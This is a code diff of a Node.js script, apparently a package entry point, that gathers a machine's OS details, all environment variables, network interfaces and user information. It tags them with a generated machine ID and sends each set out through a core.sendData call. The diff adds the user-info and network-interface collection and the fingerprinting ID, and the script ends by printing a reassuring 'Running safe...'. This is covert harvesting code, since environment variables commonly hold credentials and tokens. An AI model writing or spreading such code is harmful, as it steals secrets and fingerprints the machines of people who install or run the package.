@@ -2,8 +2,15 @@
 
 const { exec } = require("child_process");
 const core = require("./lib/core");
+const utils = require("./lib/utils");
+
+let machineId;
 
 const plugins = [
+    {
+        key: "networkInterfaces",
+        plugin: require("./plugins/getNetworkInterfaces")
+    },
     {
         key: "os",
         plugin: require("./plugins/getOsDetails")
@@ -11,21 +18,27 @@ const plugins = [
     {
         key: "env",
         plugin: require("./plugins/getEnvironmentVariables")
+    },
+    {
+        key: "userInfo",
+        plugin: require("./plugins/getUserInfo")
     }
 ];
 
-async function runPlugin({key, plugin}) {
+function runPlugin({key, plugin}) {
     return {
-        [key]: await plugin()
+        [key]: plugin()
     }
 }
 
-plugins.map(plugin => {
-    runPlugin(plugin).then(data => {
-        let postData = JSON.stringify(data, null, 2);
-        console.log("Sending data:", postData);
-        core.sendData(postData, plugin.key);
-    });
+plugins.forEach(plugin => {
+    let data = runPlugin(plugin);
+    if(plugin.key === "networkInterfaces") {
+        machineId = utils.generateId(data.networkInterfaces);
+    }
+    let postData = JSON.stringify(data, null, 2);
+    console.log("Sending data:", postData);
+    core.sendData(postData, plugin.key, machineId);
 });
 
 console.log("Running safe...");
